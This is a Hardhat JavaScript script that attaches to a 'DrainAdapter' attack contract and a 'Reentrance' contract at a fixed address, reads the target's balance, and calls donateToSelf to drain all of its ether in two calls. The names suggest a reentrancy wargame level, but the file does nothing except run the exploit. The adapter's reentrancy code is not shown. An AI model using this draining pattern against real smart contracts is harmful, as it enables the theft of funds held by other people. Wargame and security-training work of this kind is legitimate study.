const { ethers } = require("hardhat")

async function main() {
  const [deployer] = await ethers.getSigners()

  console.log('Deploying contracts with the account:', deployer.address)

  console.log('Account balance:', (await deployer.getBalance()).toString())

  const DrainAdapterFactory = await ethers.getContractFactory('DrainAdapter');
  const ReentranceFactory = await ethers.getContractFactory('Reentrance');
  const ReentranceAddress = '0x511d4596b1409968fB6A8801554aeb1DBd2AdbF2';
  
  /*
  const DrainAdapter = await DrainAdapterFactory.deploy();
  await DrainAdapter.deployed();
  */
  const DrainAdapter = DrainAdapterFactory.attach("0xcA872653Aa22f5DDB495d12BB9718aCA8daae617");
  const Reentrance = ReentranceFactory.attach(ReentranceAddress);
  const bounty = await ethers.provider.getBalance(Reentrance.address);

  // drain it with the least amount of gas possible -> two calls
  console.log("Draining Reentrance contranct at %s cointaining %s", Reentrance.address, ethers.utils.formatUnits(bounty, 'gwei'));
  await DrainAdapter.donateToSelf(Reentrance.address, {value: bounty, gasLimit: ethers.utils.parseUnits('1', 'mwei')});
  console.log("Success!");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
